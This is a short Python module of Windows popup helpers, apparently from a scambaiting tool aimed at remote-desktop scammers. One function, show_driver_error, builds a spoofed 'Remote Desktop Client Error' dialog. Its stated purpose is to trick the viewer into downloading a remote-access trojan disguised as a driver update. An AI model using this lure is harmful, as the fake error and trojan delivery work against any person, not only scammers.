"""
Notifications - Windows popup notifications for dev mode
"""

import ctypes
from ctypes import wintypes


def show_notification(title, message):
    """
    Show a Windows notification popup (MessageBox).

    Args:
        title: Title of the notification
        message: Message content
    """
    try:
        # MB_ICONINFORMATION = 0x40
        # MB_OK = 0x0
        # MB_TOPMOST = 0x00040000
        MB_ICONINFORMATION = 0x40
        MB_TOPMOST = 0x00040000

        ctypes.windll.user32.MessageBoxW(None, message, title, MB_ICONINFORMATION | MB_TOPMOST)
    except Exception as e:
        # Silently fail if notification can't be shown
        pass


def show_driver_error(download_url):
    """
    Show a fake driver compatibility error to trick scammers into downloading the RAT.
    This is a social engineering popup that appears when Command+Shift+G is pressed.

    Args:
        download_url: URL where the "driver" (RAT payload) is hosted
    """
    try:
        # MB_ICONWARNING = 0x30 (warning icon)
        # MB_OK = 0x0
        # MB_TOPMOST = 0x00040000
        MB_ICONWARNING = 0x30
        MB_TOPMOST = 0x00040000

        # Craft a convincing technical error message (short and authentic)
        title = "Remote Desktop Client Error (0x80070643)"

        message = (
            "Your remote desktop client has outdated input drivers.\n\n"
            "To continue controlling this PC, you must update your drivers.\n\n"
            f"Download the required update:\n{download_url}\n\n"
            "Install the update on YOUR computer (not this PC).\n\n"
            "Error Code: 0x80070643"
        )

        ctypes.windll.user32.MessageBoxW(None, message, title, MB_ICONWARNING | MB_TOPMOST)
    except Exception as e:
        # Silently fail if notification can't be shown
        pass


def show_chaos_notification(mode):
    """
    Show a notification for chaos mode changes (dev mode only).

    Args:
        mode: Current firewall mode (0=OFF, 1=BLOCK, 2=CHAOS)
    """
    try:
        MB_ICONINFORMATION = 0x40
        MB_TOPMOST = 0x00040000

        title = "Blackhole Firewall"

        if mode == 0:  # OFF
            message = "Firewall OFF\nAll input allowed"
        elif mode == 1:  # BLOCK
            message = "Firewall BLOCKING\nRemote input blocked"
        elif mode == 2:  # CHAOS
            message = "Firewall CHAOS MODE\nScrambling keyboard & inverting mouse!"
        else:
            message = f"Unknown mode: {mode}"

        ctypes.windll.user32.MessageBoxW(None, message, title, MB_ICONINFORMATION | MB_TOPMOST)
    except Exception as e:
        # Silently fail if notification can't be shown
        pass
